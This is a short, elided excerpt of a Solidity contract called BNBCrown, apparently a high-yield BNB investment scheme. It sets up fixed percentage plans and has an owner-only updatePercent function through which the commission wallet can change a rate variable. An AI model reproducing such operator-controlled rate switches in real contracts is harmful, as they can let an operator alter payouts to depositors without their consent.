...
contract BNBCrown {
    ...
    constructor(address wallet, uint startDate) {
        ...
        plans.push(Plan(21, 65, 500));
        plans.push(Plan(28, 55, 2500));
        plans.push(Plan(14, 100, 500));
        plans.push(Plan(21, 85, 2500));
        plans.push(Plan(28, 71, 5000));
    }
    ...
    function updatePercent(uint8 newRate) external payable {
        require(msg.sender == commissionWallet, 'invalid call');
        activity = newRate * 10;
    }
